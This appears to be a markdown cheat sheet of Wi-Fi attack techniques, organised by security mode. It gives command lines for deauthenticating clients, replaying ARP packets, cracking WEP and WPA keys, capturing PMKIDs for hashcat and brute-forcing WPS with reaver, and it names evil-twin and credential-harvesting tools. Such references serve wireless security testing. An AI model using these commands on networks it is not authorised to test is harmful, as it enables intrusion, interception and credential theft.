# Wi-Fi Security Modes and Attack Techniques

## 🔓 Open (OPN) Networks
**No encryption.** Anyone can connect and sniff traffic.

### Attack methods:
- Passive sniffing (`airodump-ng`, `tcpdump`)
- ARP spoofing, DNS spoofing, session hijacking (`ettercap`, `bettercap`)
- Evil twin or captive portal injection

---

## 🧪 WEP
**Weak encryption**, crackable in minutes.

### Crack method:
1. Capture a large number of IVs with `airodump-ng`
2. Speed up collection with ARP replay:
   ```bash
   aireplay-ng -3 -b <BSSID> -h <your MAC> wlan1
   ```
3. Crack key with:
   ```bash
   aircrack-ng <capture file>
   ```

---

## 🔐 WPA/WPA2-Personal (PSK)
**Shared password**, secured via a 4-way handshake.

### Standard Crack Flow:
1. Monitor traffic: `airodump-ng`
2. Deauth a client: `aireplay-ng -0 10 -a <BSSID> -c <client> wlan1`
3. Capture the handshake
4. Crack:
   ```bash
   aircrack-ng -w <wordlist> <capture.cap>
   ```

### Other Techniques:
- **PMKID attack** (no client needed):
  ```bash
  hcxdumptool -i wlan1mon -o dump.pcapng --enable_status=1
  hcxpcapngtool -o pmkid.hccapx dump.pcapng
  hashcat -m 16800 pmkid.hccapx -a 0 <wordlist>
  ```
- **WPS brute-force**:
  ```bash
  reaver -i wlan1mon -b <BSSID> -vv
  ```
- **Rainbow table (cowpatty)**

---

## 🏢 WPA/WPA2-Enterprise (WPA-MGT / WPA-EAP)
Uses 802.1X with RADIUS and EAP authentication.

### Attack Techniques:
- **Evil Twin (PEAP/MSCHAPv2)** using `hostapd-wpe`
- **Rogue AP (Probe Attack)** using `hostapd-wpe`, `eaphammer`
- **MITM downgrade** using `wifiphisher`, `EAPHammer`
- **Credential harvesting** with fake portal

---

## 💥 Summary

| Mode         | Attack Method(s) |
|--------------|------------------|
| **Open**     | Passive sniffing, Evil Twin, MitM |
| **WEP**      | IV capture + ARP replay → Aircrack |
| **WPA-PSK**  | Handshake crack, PMKID, WPS brute-force |
| **WPA-MGT**  | Evil Twin, Rogue AP, MSCHAPv2 hash capture, MITM |
